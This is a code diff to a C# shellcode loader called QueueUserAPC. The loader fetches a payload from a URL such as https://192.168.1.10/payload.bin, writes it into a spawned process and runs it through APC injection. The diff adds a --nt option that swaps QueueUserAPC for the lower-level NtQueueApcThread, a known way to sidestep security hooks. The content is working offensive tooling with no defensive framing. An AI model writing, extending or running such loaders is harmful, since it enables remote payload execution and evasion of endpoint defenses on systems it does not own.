@@ -13,7 +13,10 @@ namespace QueueUserAPC
             if (args.Length < 1)
                 throw new ArgumentException("Shellcode URL is required.");
 
-            var url = args[0];
+            // Skip --nt flag when looking for the URL
+            var url = Array.Find(args, a => !a.StartsWith("--"))
+                      ?? throw new ArgumentException("Shellcode URL is required.");
+
             if (!Uri.TryCreate(url, UriKind.Absolute, out var uri) ||
                 (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps))
                 throw new ArgumentException($"URL must use http or https scheme: {url}");
@@ -21,18 +24,31 @@ namespace QueueUserAPC
             return url;
         }
 
+        /// <summary>
+        /// Returns true when the <c>--nt</c> flag is present, selecting the
+        /// <see cref="Win32.NtQueueApcThread"/> variant over <see cref="Win32.QueueUserAPC"/>.
+        /// </summary>
+        internal static bool ParseUseNt(string[] args) =>
+            Array.Exists(args, a => a.Equals("--nt", StringComparison.OrdinalIgnoreCase));
+
         static async Task Main(string[] args)
         {
             string shellcodeUrl;
+            bool useNt;
             try
             {
                 shellcodeUrl = ParseUrl(args);
+                useNt = ParseUseNt(args);
             }
             catch (ArgumentException ex)
             {
                 Console.Error.WriteLine($"Error: {ex.Message}");
-                Console.Error.WriteLine("Usage: QueuserAPC <shellcode-url>");
+                Console.Error.WriteLine("Usage: QueuserAPC [--nt] <shellcode-url>");
                 Console.Error.WriteLine("  e.g. QueuserAPC https://192.168.1.10/payload.bin");
+                Console.Error.WriteLine("       QueuserAPC --nt https://192.168.1.10/payload.bin");
+                Console.Error.WriteLine();
+                Console.Error.WriteLine("Flags:");
+                Console.Error.WriteLine("  --nt   Use NtQueueApcThread (ntdll) instead of QueueUserAPC (kernel32)");
                 Environment.Exit(1);
                 return;
             }
@@ -98,7 +114,10 @@ namespace QueueUserAPC
                 Win32.MemoryProtection.ExecuteRead,
                 out _);
 
-            Win32.QueueUserAPC(baseAddress, pi.hThread, 0);
+            if (useNt)
+                Win32.NtQueueApcThread(pi.hThread, baseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+            else
+                Win32.QueueUserAPC(baseAddress, pi.hThread, 0);
 
             Win32.ResumeThread(pi.hThread);
         }
